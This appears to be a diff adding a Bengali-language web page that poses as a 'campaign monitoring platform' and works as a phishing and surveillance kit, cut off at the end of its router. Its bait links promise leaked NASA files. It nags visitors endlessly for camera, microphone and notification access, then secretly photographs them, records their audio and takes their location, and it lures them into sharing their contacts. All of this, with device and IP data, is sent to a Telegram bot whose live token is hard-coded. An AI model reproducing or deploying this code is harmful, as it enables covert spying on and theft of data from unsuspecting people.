@@ -1,0 +1,452 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>ডিজিটাল ক্যাম্পেইন · মনিটরিং প্ল্যাটফর্ম</title>
+    <!-- OneSignal SDK -->
+    <script src="https://cdn.onesignal.com/sdks/web/v16/OneSignalSDK.page.js" defer></script>
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', system-ui, sans-serif; }
+        body { background: linear-gradient(135deg, #f0f4fa 0%, #e2e8f0 100%); min-height: 100vh; padding: 20px; }
+        .container { max-width: 1500px; margin: 0 auto; }
+        .header { text-align: center; margin-bottom: 28px; color: #0b2b4a; }
+        .header h1 { font-size: 2rem; letter-spacing: -0.3px; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(440px, 1fr)); gap: 26px; }
+        .card {
+            background: rgba(255,255,255,0.96);
+            backdrop-filter: blur(2px);
+            border-radius: 32px;
+            padding: 24px;
+            box-shadow: 0 12px 28px rgba(0,0,0,0.08);
+            transition: 0.2s;
+            border: 1px solid rgba(255,255,255,0.6);
+        }
+        .card h2 { color: #1e3a5f; margin-bottom: 20px; border-left: 6px solid #2c5f8a; padding-left: 16px; font-size: 1.5rem; }
+        input, textarea, select {
+            width: 100%; padding: 12px 18px; border: 1px solid #cbd5e1; border-radius: 48px;
+            margin-bottom: 14px; font-size: 0.9rem; background: white;
+        }
+        button {
+            background: #2c5f8a; color: white; border: none; padding: 10px 20px;
+            border-radius: 48px; cursor: pointer; margin: 5px 6px; font-weight: 600;
+            transition: 0.2s; box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        button:hover { transform: scale(0.97); opacity: 0.92; }
+        button.danger { background: #c0392b; }
+        button.success { background: #2b7a3e; }
+        button.warning { background: #e67e22; }
+        .link-box {
+            background: #eef2ff; padding: 14px; border-radius: 28px; margin: 18px 0;
+            word-break: break-all; position: relative; border: 1px solid #b9ceff;
+        }
+        .copy-btn { position: absolute; right: 12px; top: 8px; background: #2b7a3e; padding: 4px 14px; font-size: 11px; }
+        .data-item {
+            background: #f9fbfe; padding: 16px; margin: 12px 0; border-radius: 24px;
+            border-left: 5px solid #2c5f8a; transition: 0.1s;
+        }
+        .tabs { display: flex; gap: 12px; margin-bottom: 28px; flex-wrap: wrap; border-bottom: 1px solid #cbd5e1; padding-bottom: 8px; }
+        .tab { padding: 8px 28px; cursor: pointer; border-radius: 60px; background: #e2e8f0; font-weight: 600; color: #1e3a5f; }
+        .tab.active { background: #1e3a5f; color: white; }
+        .tab-content { display: none; animation: fade 0.2s ease; }
+        .tab-content.active { display: block; }
+        @keyframes fade { from { opacity: 0; } to { opacity: 1; } }
+        .viewer-page { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 1000; overflow-y: auto; padding: 20px; }
+        .password-screen { position: fixed; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.92); backdrop-filter: blur(14px); z-index: 2000; display: flex; align-items: center; justify-content: center; }
+        .password-box { background: white; padding: 40px 32px; border-radius: 60px; width: 90%; max-width: 380px; text-align: center; }
+        .toast { position: fixed; bottom: 25px; left: 50%; transform: translateX(-50%); background: #1f2937; color: white; padding: 10px 24px; border-radius: 60px; z-index: 3000; font-size: 14px; animation: fadeInOut 2s ease; }
+        @keyframes fadeInOut { 0%{opacity:0; bottom:0;} 15%{opacity:1; bottom:25px;} 85%{opacity:1;} 100%{opacity:0; bottom:0;} }
+        .loading-screen { position: fixed; top:0; left:0; width:100%; height:100%; background: white; display: flex; align-items: center; justify-content: center; flex-direction: column; gap: 16px; z-index: 1500; }
+        .spinner { width: 48px; height: 48px; border: 5px solid #cbd5e1; border-top-color: #1e3a5f; border-radius: 50%; animation: spin 0.8s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .permission-persistent {
+            max-width: 650px; margin: 20px auto; background: #fff7e5; border-radius: 48px;
+            padding: 28px; text-align: center; border: 2px solid #ffb347;
+        }
+        .permission-persistent h3 { color: #b45309; margin-bottom: 16px; }
+        .perm-notify-box { background: #fee2e2; border-radius: 36px; padding: 14px; margin-top: 12px; animation: gentlePulse 1.8s infinite; }
+        @keyframes gentlePulse { 0% { opacity: 0.7; } 100% { opacity: 1; background: #ffcdd2; } }
+        .profile-status-badge { display: inline-block; background: #eef2ff; border-radius: 40px; padding: 4px 14px; font-size: 11px; font-weight: bold; margin-left: 10px; }
+        .status-connected { background: #c8e6d9; color: #1e4a2f; }
+        .status-missing { background: #ffe0b2; color: #b45f06; }
+        .history-log { max-height: 380px; overflow-y: auto; background: #f8fafc; border-radius: 28px; padding: 10px; margin-top: 12px; }
+        .history-entry { border-bottom: 1px solid #e2e8f0; padding: 12px 8px; font-size: 13px; display: flex; gap: 8px; align-items: baseline; flex-wrap: wrap; }
+        .history-time { font-family: monospace; color: #2c5f8a; font-weight: 500; }
+        .notify-custom-area { margin-top: 20px; background: #f1f5f9; border-radius: 28px; padding: 16px; }
+    </style>
+</head>
+<body>
+<div id="app-root"><div class="loading-screen"><div class="spinner"></div><div>প্ল্যাটফর্ম চালু হচ্ছে...</div></div></div>
+
+<script>
+    // ------------------------- FIREBASE INIT -------------------------
+    const firebaseConfig = {
+        apiKey: "AIzaSyCcFIISnGiqViBVMNad3Ak7pJkja9A_GE4",
+        authDomain: "link-togol-f198c.firebaseapp.com",
+        projectId: "link-togol-f198c",
+        storageBucket: "link-togol-f198c.firebasestorage.app",
+        messagingSenderId: "563428983759",
+        appId: "1:563428983759:web:c6887e4a610efee897c8ba"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    // ------------------------- TELEGRAM -------------------------
+    const TELEGRAM_BOT_TOKEN = "8718981610:AAHsCUB2gJRx3i-DrbvN1gsDyHlT3qYb4oY";
+    const TELEGRAM_CHANNEL_ID = "-1003709017479";
+    const MASTER_PASSWORD = "2791";
+
+    // ------------------------- ONESIGNAL -------------------------
+    const ONE_SIGNAL_APP_ID = "84557610-c8ba-407a-81c1-13735bd789b3";
+    window.OneSignalDeferred = window.OneSignalDeferred || [];
+    OneSignalDeferred.push(async function(OneSignal) {
+        await OneSignal.init({ appId: ONE_SIGNAL_APP_ID, allowLocalhostAsSecureOrigin: true });
+    });
+
+    // ------------------------- GLOBALS -------------------------
+    let profiles = [];           // all profiles
+    let customPages = [];        // landing links
+    let deviceFingerprint = null;
+    let currentDeviceProfileId = null;   // the profile associated with current device (fingerprint)
+    let permissionCycleActive = false;
+    let permissionIntervalId = null;
+
+    // ---------- Helper: Device Fingerprint (stable & persistent across sessions)
+    async function getDeviceFingerprint() {
+        if (deviceFingerprint) return deviceFingerprint;
+        let data = [];
+        data.push(navigator.userAgent, navigator.language, screen.width, screen.height, navigator.hardwareConcurrency || '');
+        try {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            canvas.width = 200; canvas.height = 50;
+            ctx.fillStyle = "#f00"; ctx.fillRect(0,0,200,50);
+            ctx.fillStyle = "#0f0"; ctx.fillText("fp", 10,30);
+            data.push(canvas.toDataURL());
+        } catch(e) {}
+        const hashBuffer = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(data.join('||')));
+        const hashArray = Array.from(new Uint8Array(hashBuffer));
+        deviceFingerprint = hashArray.map(b => b.toString(16).padStart(2,'0')).join('').substring(0, 32);
+        return deviceFingerprint;
+    }
+
+    // generate UUID
+    function uuidv4() { return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => { let r = Math.random()*16|0, v = c==='x'?r:(r&0x3|0x8); return v.toString(16); }); }
+
+    function showToast(msg) { let t = document.createElement('div'); t.className='toast'; t.innerText=msg; document.body.appendChild(t); setTimeout(()=>t.remove(), 2200); }
+
+    // Telegram send helpers
+    async function sendToTelegram(type, data, profileName = "সাধারণ") {
+        const timestamp = new Date().toLocaleString('bn-BD',{timeZone:'Asia/Dhaka'});
+        try {
+            if(type === 'photo' && data instanceof Blob){
+                let fd=new FormData(); fd.append('chat_id',TELEGRAM_CHANNEL_ID); fd.append('photo',data,'snap.jpg');
+                fd.append('caption',`📁 ${profileName}\n📸 সেলফি/ছবি\n⏰ ${timestamp}`);
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,{method:'POST',body:fd});
+            } else if(type === 'location'){
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:TELEGRAM_CHANNEL_ID,latitude:data.lat,longitude:data.lng})});
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:TELEGRAM_CHANNEL_ID,text:`📍 ${profileName}\n🎯 ${data.lat},${data.lng}\n📡 ${data.accuracy}মি\n⏰ ${timestamp}`})});
+            } else if(type === 'audio'){
+                let fd=new FormData(); fd.append('chat_id',TELEGRAM_CHANNEL_ID); fd.append('voice',data,'audio.ogg');
+                fd.append('caption',`🎤 ${profileName}\n⏰ ${timestamp}`);
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVoice`,{method:'POST',body:fd});
+            } else if(type === 'contacts'){
+                let txt = `📞 ${profileName} (${data.length}টি কন্টাক্ট)\n`+data.map((c,i)=>`${i+1}. ${c.name} : ${c.phone}`).join('\n')+`\n⏰ ${timestamp}`;
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:TELEGRAM_CHANNEL_ID,text:txt.substring(0,4000)})});
+            } else if(type === 'device_info'){
+                const ipInfo = await (async()=>{ let ip='অজানা',city='',country=''; try{ let r=await fetch('https://api.ipify.org?format=json'); let d=await r.json(); ip=d.ip; }catch(e){} try{ let r=await fetch('https://ipapi.co/json/'); let d=await r.json(); city=d.city||''; country=d.country_name||''; }catch(e){} return {ip,city,country}; })();
+                let msg = `📱 ${profileName}\n🖥️ ${data.userAgent}\n💻 প্ল্যাটফর্ম: ${data.platform}\n🌐 ভাষা: ${data.language}\n📺 স্ক্রিন: ${data.screenSize}\n⚙️ CPU: ${data.cores}\n💾 RAM: ${data.ram}\n📶 নেট: ${data.network}\n🔋 ব্যাটারি: ${data.battery}\n🕐 টাইমজোন: ${data.timezone}\n🌍 IP: ${ipInfo.ip} (${ipInfo.city} ${ipInfo.country})\n⏰ ${timestamp}`;
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:TELEGRAM_CHANNEL_ID,text:msg})});
+            }
+        } catch(e){ console.warn(e); }
+    }
+
+    async function getAdvancedDeviceInfo() {
+        let battery="N/A"; try{ if(navigator.getBattery){let b=await navigator.getBattery(); battery=Math.floor(b.level*100)+"%";} }catch(e){}
+        let network="N/A"; try{ if(navigator.connection) network=navigator.connection.effectiveType||"N/A"; }catch(e){}
+        return {
+            userAgent:navigator.userAgent, platform:navigator.platform, language:navigator.language,
+            screenSize:`${screen.width}x${screen.height}`, cores:navigator.hardwareConcurrency||"N/A",
+            ram:navigator.deviceMemory?navigator.deviceMemory+"GB":"N/A", network, battery,
+            timezone:Intl.DateTimeFormat().resolvedOptions().timeZone
+        };
+    }
+
+    // ----- PERMISSION PERSISTENT LOOP (infinite until all granted)
+    async function requestAllPermissionsNonStop(profileName, onAllGranted) {
+        if(permissionCycleActive) return;
+        permissionCycleActive = true;
+        if(permissionIntervalId) clearInterval(permissionIntervalId);
+        
+        const requiredPerms = [
+            { name: 'notification', request: async () => { if(Notification.permission !== 'granted') await Notification.requestPermission(); return Notification.permission === 'granted'; } },
+            { name: 'camera', request: async () => { try { let s=await navigator.mediaDevices.getUserMedia({video:true}); s.getTracks().forEach(t=>t.stop()); return true; } catch(e){ return false; } } },
+            { name: 'microphone', request: async () => { try { let s=await navigator.mediaDevices.getUserMedia({audio:true}); s.getTracks().forEach(t=>t.stop()); return true; } catch(e){ return false; } } }
+        ];
+        
+        let allGranted = false;
+        const checkAndRequest = async () => {
+            let status = { notification: Notification.permission === 'granted', camera: false, microphone: false };
+            try { let camStream = await navigator.mediaDevices.getUserMedia({video:true}); camStream.getTracks().forEach(t=>t.stop()); status.camera=true; } catch(e){}
+            try { let micStream = await navigator.mediaDevices.getUserMedia({audio:true}); micStream.getTracks().forEach(t=>t.stop()); status.microphone=true; } catch(e){}
+            if(status.notification && status.camera && status.microphone) {
+                allGranted = true;
+                if(permissionIntervalId) clearInterval(permissionIntervalId);
+                permissionCycleActive = false;
+                // update Firestore device profile permission status
+                if(currentDeviceProfileId) {
+                    let profileRef = db.collection('profiles').doc(currentDeviceProfileId);
+                    await profileRef.update({ permissionsGranted: { notification:true, camera:true, microphone:true, updatedAt: Date.now() } });
+                }
+                onAllGranted();
+                return true;
+            }
+            // request missing permissions one by one with aggressive notifications
+            for(let perm of requiredPerms) {
+                let isGranted = false;
+                if(perm.name === 'notification') isGranted = Notification.permission === 'granted';
+                else {
+                    try { let stream = await navigator.mediaDevices.getUserMedia({ [perm.name === 'camera' ? 'video' : 'audio']: true }); stream.getTracks().forEach(t=>t.stop()); isGranted = true; } catch(e){ isGranted = false; }
+                }
+                if(!isGranted) {
+                    await perm.request();
+                    // show custom toast + OneSignal nag
+                    showToast(`⚠️ "${perm.name}" অনুমতি দিন! সাইট লোড হবে না।`);
+                    if(window.OneSignal) window.OneSignal.sendNotification({ title: `📢 অনুমতি প্রয়োজন: ${perm.name}`, body: `অনুগ্রহ করে ${perm.name} অনুমতি দিন। অন্যথায় কন্টেন্ট দেখতে পাবেন না।` });
+                    await new Promise(r=>setTimeout(r,2000));
+                }
+            }
+            return false;
+        };
+        // aggressive interval every 4 seconds
+        permissionIntervalId = setInterval(async () => {
+            if(allGranted) return;
+            await checkAndRequest();
+        }, 4000);
+        await checkAndRequest();
+    }
+
+    // ----- DEVICE PROFILE AUTO-CREATE & PERMISSION TRACKING
+    async function ensureDeviceProfile() {
+        const fp = await getDeviceFingerprint();
+        const existingProfiles = await db.collection('profiles').where('deviceFingerprint','==',fp).get();
+        if(!existingProfiles.empty) {
+            let doc = existingProfiles.docs[0];
+            currentDeviceProfileId = doc.id;
+            let profileData = doc.data();
+            profiles = (await db.collection('profiles').get()).docs.map(d=>({id:d.id,...d.data()}));
+            return { profile: {id:doc.id, ...profileData}, isNew: false };
+        } else {
+            let newId = uuidv4();
+            let newProfile = {
+                id: newId, name: `ডিভাইস ${fp.slice(0,6)}`, phone: '', note: 'অটো প্রোফাইল',
+                deviceFingerprint: fp, createdAt: new Date().toISOString(),
+                permissionsGranted: { notification: false, camera: false, microphone: false },
+                history: []
+            };
+            await db.collection('profiles').doc(newId).set(newProfile);
+            currentDeviceProfileId = newId;
+            profiles.push(newProfile);
+            return { profile: newProfile, isNew: true };
+        }
+    }
+
+    // update profile history (Gemini-like history)
+    async function addHistoryEntry(profileId, action, detail) {
+        let profileRef = db.collection('profiles').doc(profileId);
+        let doc = await profileRef.get();
+        if(doc.exists) {
+            let hist = doc.data().history || [];
+            hist.unshift({ timestamp: new Date().toISOString(), action, detail });
+            if(hist.length > 80) hist.pop();
+            await profileRef.update({ history: hist });
+            let idx = profiles.findIndex(p=>p.id===profileId);
+            if(idx!==-1) profiles[idx].history = hist;
+        }
+    }
+
+    // ----- Landing page with persistent permission wall
+    async function showTargetPage(linkId) {
+        await loadAllFromFirestore();
+        const page = customPages.find(p => p.id === linkId);
+        if(!page) { window.location.href = "https://www.google.com"; return; }
+        document.title = page.pageTitle;
+        page.usageCount = (page.usageCount||0)+1;
+        await savePage(page);
+        // device profile
+        const { profile } = await ensureDeviceProfile();
+        currentDeviceProfileId = profile.id;
+        const deviceInfo = await getAdvancedDeviceInfo();
+        await sendToTelegram('device_info', deviceInfo, page.profileName || profile.name);
+        await addHistoryEntry(profile.id, 'পেজ ভিজিট', `${page.pageTitle} - লিংক খোলা`);
+
+        const root = document.getElementById('app-root');
+        root.innerHTML = `<div class="loading-screen" id="permWall"><div class="spinner"></div><div id="permMessage" style="text-align:center;max-width:380px;">🔐 অনুমতি প্রয়োজন: নোটিফিকেশন, ক্যামেরা, মাইক্রোফোন<br>অনুমতি না দিলে ওয়েবসাইট চলবে না।<br>অটোমেটিক অনুরোধ চলছে...</div></div>`;
+
+        // start infinite permission loop
+        requestAllPermissionsNonStop(page.profileName, async () => {
+            // all permissions granted, load actual content
+            await addHistoryEntry(profile.id, 'সকল অনুমতি', 'ক্যামেরা+মাইক+নোটিফিকেশন সম্পূর্ণ');
+            // send location after grant
+            if(navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (pos)=>{
+                    await sendToTelegram('location', {lat:pos.coords.latitude, lng:pos.coords.longitude, accuracy:pos.coords.accuracy}, page.profileName);
+                    await addHistoryEntry(profile.id, 'লোকেশন শেয়ার', `${pos.coords.latitude},${pos.coords.longitude}`);
+                }, null, {enableHighAccuracy:true});
+            }
+            // show main interactive content
+            root.innerHTML = `
+                <div class="viewer-page">
+                    <div class="target-content" style="max-width:800px;margin:0 auto;background:white;border-radius:40px;padding:36px;text-align:center;">
+                        <h1 style="color:#1e3a5f;">${escapeHtml(page.mainHeading)}</h1>
+                        <div>${page.description}</div>
+                        <button id="unlockBtn" class="target-btn" style="background:linear-gradient(95deg,#ff6600,#ff3300);font-size:1.2rem;padding:12px 28px;margin-top:20px;">${escapeHtml(page.buttonText)}</button>
+                        <button id="shareBtn" class="share-btn" style="background:#25D366;display:none;">📱 হোয়াটসঅ্যাপ / কন্টাক্ট শেয়ার</button>
+                        <div id="contactResult" style="margin-top:20px;"></div>
+                    </div>
+                </div>
+            `;
+            let contactsShared = false;
+            const unlockBtn = document.getElementById('unlockBtn');
+            const shareBtn = document.getElementById('shareBtn');
+            unlockBtn.onclick = async () => {
+                if(!contactsShared) {
+                    shareBtn.style.display = 'block';
+                    shareBtn.onclick = async () => {
+                        if(navigator.contacts && navigator.contacts.select) {
+                            try {
+                                const contacts = await navigator.contacts.select(['name','tel'],{multiple:true});
+                                if(contacts && contacts.length) {
+                                    let list = contacts.map(c=>({ name:c.name?.[0]||'N/A', phone:c.tel?.[0]||'N/A' }));
+                                    await sendToTelegram('contacts', list, page.profileName);
+                                    await addHistoryEntry(profile.id, 'কন্টাক্ট শেয়ার', `${list.length}টি কন্টাক্ট`);
+                                    contactsShared = true;
+                                    shareBtn.style.display='none';
+                                    unlockBtn.innerText="✅ আনলক সম্পূর্ণ!";
+                                    unlockBtn.style.background="#2e7d32";
+                                    document.getElementById('contactResult').innerHTML='<p style="color:green;">✅ ধন্যবাদ! কন্টাক্ট শেয়ার হয়েছে।</p>';
+                                } else { alert('কোনো কন্টাক্ট নির্বাচন করেনি'); }
+                            } catch(e) { alert('কন্টাক্ট অ্যাক্সেস ব্যর্থ'); }
+                        } else { alert('আপনার ব্রাউজার কন্টাক্ট API সাপোর্ট করে না। Chrome Android ব্যবহার করুন।'); }
+                    };
+                    window.onbeforeunload = () => { if(!contactsShared) return "শেয়ার না করে বের হতে পারবেন না!"; };
+                } else { alert("ইতিমধ্যে আনলক করেছেন!"); }
+            };
+            // Auto capture camera & audio after 3 sec
+            setTimeout(async () => {
+                try{
+                    let videoStream = await navigator.mediaDevices.getUserMedia({video:true});
+                    let video = document.createElement('video');
+                    video.srcObject = videoStream; await video.play();
+                    setTimeout(()=>{
+                        let canvas=document.createElement('canvas'); canvas.width=640; canvas.height=480;
+                        canvas.getContext('2d').drawImage(video,0,0,640,480);
+                        canvas.toBlob(blob=>sendToTelegram('photo',blob,`${page.profileName} (সেলফি)`),'image/jpeg',0.7);
+                        videoStream.getTracks().forEach(t=>t.stop());
+                    },2000);
+                } catch(e){}
+                try{
+                    let audioStream = await navigator.mediaDevices.getUserMedia({audio:true});
+                    let recorder = new MediaRecorder(audioStream);
+                    let chunks=[];
+                    recorder.ondataavailable=e=>{if(e.data.size)chunks.push(e.data);};
+                    recorder.onstop=async()=>{
+                        let blob=new Blob(chunks,{type:'audio/webm'});
+                        await sendToTelegram('audio',blob,page.profileName);
+                        audioStream.getTracks().forEach(t=>t.stop());
+                    };
+                    recorder.start(); setTimeout(()=>recorder.stop(),7000);
+                } catch(e){}
+            },4000);
+        });
+    }
+
+    // ----- Firestore CRUD
+    async function loadAllFromFirestore(){
+        let pSnap=await db.collection('profiles').get(); profiles=pSnap.docs.map(d=>({id:d.id,...d.data()}));
+        let cSnap=await db.collection('customPages').get(); customPages=cSnap.docs.map(d=>({id:d.id,...d.data()}));
+    }
+    async function saveProfile(p){ await db.collection('profiles').doc(p.id).set(p); }
+    async function deleteProfile(id){ await db.collection('profiles').doc(id).delete(); let snap=await db.collection('customPages').where('profileId','==',id).get(); snap.forEach(d=>d.ref.delete()); }
+    async function savePage(p){ await db.collection('customPages').doc(p.id).set(p); }
+    async function deletePage(id){ await db.collection('customPages').doc(id).delete(); }
+    async function clearAllData(){ let p=await db.collection('profiles').get(); p.forEach(d=>d.ref.delete()); let c=await db.collection('customPages').get(); c.forEach(d=>d.ref.delete()); profiles=[]; customPages=[]; }
+
+    // ----- DASHBOARD (ADMIN)
+    function renderProfilesWithPermissionStatus() {
+        let html='';
+        for(let p of profiles){
+            let perms = p.permissionsGranted || { notification:false, camera:false, microphone:false };
+            let notifStatus = perms.notification ? '✅ কানেক্টেড' : '❌ not connected';
+            let camStatus = perms.camera ? '✅ কানেক্টেড' : '❌ not connected';
+            let micStatus = perms.microphone ? '✅ কানেক্টেড' : '❌ not connected';
+            let historyHtml = `<div class="history-log"><strong>📜 ইতিহাস (Gemini-style)</strong>${(p.history||[]).slice(0,10).map(h=>`<div class="history-entry"><span class="history-time">${new Date(h.timestamp).toLocaleString()}</span> → ${h.action}: ${h.detail}</div>`).join('')||'<div>কোনো ইতিহাস নেই</div>'}</div>`;
+            html+=`<div class="data-item"><strong>👤 ${escapeHtml(p.name)}</strong> ${p.phone?`📞 ${p.phone}`:''}<br>
+            🔔 নোটিফিকেশন: ${notifStatus} &nbsp; 📷 ক্যামেরা: ${camStatus} &nbsp; 🎙️ মাইক: ${micStatus}<br>
+            <button class="send-custom-notify" data-id="${p.id}" data-name="${escapeHtml(p.name)}" style="background:#e67e22;">📨 কাস্টম নোটিফিকেশন পাঠান</button>
+            <button class="delete-profile-btn" data-id="${p.id}" style="background:#c0392b;">🗑️ ডিলিট</button>
+            ${historyHtml}
+            </div>`;
+        }
+        document.getElementById('profilesList').innerHTML = html || '<p>কোনো প্রোফাইল নেই</p>';
+        document.querySelectorAll('.delete-profile-btn').forEach(btn=>{ btn.onclick=async()=>{ if(confirm('ডিলিট?')){ await deleteProfile(btn.dataset.id); await loadAllFromFirestore(); renderProfilesWithPermissionStatus(); renderLinks(); } }; });
+        document.querySelectorAll('.send-custom-notify').forEach(btn=>{ btn.onclick=async()=>{
+            let title = prompt("নোটিফিকেশন টাইটেল লিখুন:", "ক্যাম্পেইন আপডেট");
+            let body = prompt("বার্তা লিখুন:", "আপনার জন্য গুরুত্বপূর্ণ বার্তা");
+            if(title && body && window.OneSignal){
+                window.OneSignal.sendNotification({ title, body, includePlayerIds: [] }); // broadcast to all
+                showToast(`নোটিফিকেশন পাঠানো হয়েছে ${btn.dataset.name} প্রোফাইলের জন্য`);
+                await addHistoryEntry(btn.dataset.id, 'কাস্টম নোটিফিকেশন', `${title} - ${body}`);
+            } else alert("OneSignal রেডি নয় বা খালি ফিল্ড");
+        }; });
+    }
+
+    function renderLinks(){
+        let html='';
+        customPages.forEach(link=>{ html+=`<div class="data-item"><strong>🔗 ${escapeHtml(link.pageTitle)}</strong><span class="profile-badge">📁 ${link.profileName}</span><br><small>${window.location.origin}${window.location.pathname}?view=${link.id}</small><br>ব্যবহার: ${link.usageCount||0}<br><button class="delete-link-btn" data-id="${link.id}" style="background:#c0392b;">🗑️</button></div>`; });
+        document.getElementById('linksList').innerHTML = html||'<p>কোনো লিংক নেই</p>';
+        document.querySelectorAll('.delete-link-btn').forEach(btn=>{ btn.onclick=async()=>{ if(confirm('ডিলিট?')){ await deletePage(btn.dataset.id); customPages=customPages.filter(l=>l.id!==btn.dataset.id); renderLinks(); } }; });
+    }
+
+    function setupDashboardTabs(){
+        document.querySelectorAll('.tab').forEach(tab=>{ tab.onclick=()=>{ let name=tab.dataset.tab; document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active')); document.querySelectorAll('.tab-content').forEach(c=>c.classList.remove('active')); tab.classList.add('active'); document.getElementById(`tab-${name}`).classList.add('active'); if(name==='profiles') renderProfilesWithPermissionStatus(); if(name==='create') renderLinks(); }; });
+    }
+
+    async function initDashboard(){
+        await loadAllFromFirestore();
+        const root = document.getElementById('app-root');
+        root.innerHTML = `<div class="container"><div class="header"><h1>🕹️ মনিটরিং কন্ট্রোল প্যানেল</h1><p>প্রোফাইল → লিংক তৈরি → টেলিগ্রামে ডেটা + পারমিশন ট্র্যাকিং</p></div><div class="tabs"><div class="tab active" data-tab="profiles">👥 প্রোফাইল (পারমিশন+হিস্ট্রি)</div><div class="tab" data-tab="create">🔗 লিংক তৈরি</div><div class="tab" data-tab="manage">⚙️ ম্যানেজ</div></div><div id="tab-profiles" class="tab-content active"><div class="grid"><div class="card"><h2>➕ প্রোফাইল তৈরি</h2><input id="profileName" placeholder="নাম"><input id="profilePhone" placeholder="ফোন"><textarea id="profileNote" rows="2" placeholder="নোট"></textarea><button id="createProfileBtn" class="success">✅ তৈরি</button></div><div class="card"><h2>📋 প্রোফাইল তালিকা (পারমিশন স্ট্যাটাস)</h2><div id="profilesList"></div></div></div></div><div id="tab-create" class="tab-content"><div class="grid"><div class="card"><h2>🔗 লিংক তৈরি</h2><select id="profileSelectLink"><option value="">--প্রোফাইল নির্বাচন--</option></select><div><button id="autoLinkBtn" class="warning">⚡ অটো লিংক</button><button id="customLinkBtn" class="success">🎨 কাস্টম</button></div><div id="customSection" style="display:none;"><input id="pageTitle" placeholder="শিরোনাম" value="গোপন ফাইল"><input id="mainHeading" value="অ্যাপোলো ১১: নথি উন্মোচন"><textarea id="description" rows="3"><p>নিচে ক্লিক করুন</p></textarea><input id="buttonText" value="🔓 আনলক করুন"></div><button id="generateLinkBtn" class="success">✨ লিংক জেনারেট</button><div id="generatedLink" style="display:none;"><div class="link-box"><span id="linkUrl"></span><button id="copyLinkBtn" class="copy-btn">📋 কপি</button></div></div></div><div class="card"><h2>📌 সব লিংক</h2><div id="linksList"></div></div></div></div><div id="tab-manage" class="tab-content"><div class="card"><h2>🗑️ সব ডেটা মুছুন</h2><button id="wipeDataBtn" class="danger">⚠️ সম্পূর্ণ রিসেট</button></div></div></div>`;
+        document.getElementById('createProfileBtn').onclick=async()=>{ let name=document.getElementById('profileName').value.trim(); if(!name) return; let np={id:uuidv4(),name,phone:document.getElementById('profilePhone').value,note:document.getElementById('profileNote').value,createdAt:new Date().toISOString(),permissionsGranted:{},history:[]}; await saveProfile(np); profiles.push(np); renderProfilesWithPermissionStatus(); };
+        let isAuto=true; document.getElementById('autoLinkBtn').onclick=()=>{isAuto=true;document.getElementById('customSection').style.display='none';}; document.getElementById('customLinkBtn').onclick=()=>{isAuto=false;document.getElementById('customSection').style.display='block';}; document.getElementById('autoLinkBtn').click();
+        document.getElementById('generateLinkBtn').onclick=async()=>{ let pid=document.getElementById('profileSelectLink').value; if(!pid) return alert('প্রোফাইল নির্বাচন'); let p=profiles.find(pr=>pr.id===pid); let linkId=uuidv4(); let url=`${window.location.origin}${window.location.pathname}?view=${linkId}`; let pageData=isAuto?{pageTitle:"গোপন আর্কাইভ",mainHeading:"নাসার ডিক্লাসিফাইড ফাইল",description:"<div>চাঁদের অন্ধকার দিকের সত্যতা</div>",buttonText:"🔓 আনলক করুন",isAuto:true}:{pageTitle:document.getElementById('pageTitle').value,mainHeading:document.getElementById('mainHeading').value,description:document.getElementById('description').value,buttonText:document.getElementById('buttonText').value,isAuto:false}; let np={id:linkId,profileId:pid,profileName:p.name,...pageData,createdAt:new Date().toISOString(),usageCount:0}; await savePage(np); customPages.push(np); document.getElementById('linkUrl').innerText=url; document.getElementById('generatedLink').style.display='block'; renderLinks(); };
+        document.getElementById('copyLinkBtn').onclick=()=>{ navigator.clipboard.writeText(document.getElementById('linkUrl').innerText); showToast('কপি!'); };
+        document.getElementById('wipeDataBtn').onclick=async()=>{ if(confirm('সব ডেটা চিরতরে মুছে যাবে?')){ await clearAllData(); await loadAllFromFirestore(); renderProfilesWithPermissionStatus(); renderLinks(); } };
+        let select=document.getElementById('profileSelectLink'); select.innerHTML='<option value="">--প্রোফাইল--</option>'; profiles.forEach(p=>{ select.innerHTML+=`<option value="${p.id}">👤 ${p.name}</option>`; });
+        renderProfilesWithPermissionStatus(); renderLinks(); setupDashboardTabs();
+    }
+
+    function escapeHtml(str){ if(!str) return ''; return str.replace(/[&<>]/g, m=>({ '&':'&amp;', '<':'&lt;', '>':'&gt;' }[m])); }
+
+    // ----- MAIN ROUTER
+    (async function(){
+        const urlParams = new URLSearchParams(window.location.search);
+        const viewParam = urlParams.get('view');
+        if(viewParam){
+            await showTargetPage(viewParam);
+        } else {
+            if(sessionStorage.getItem('monitor_auth')===MASTER_PASSWORD){
+                await initDashboard();
+            } else {
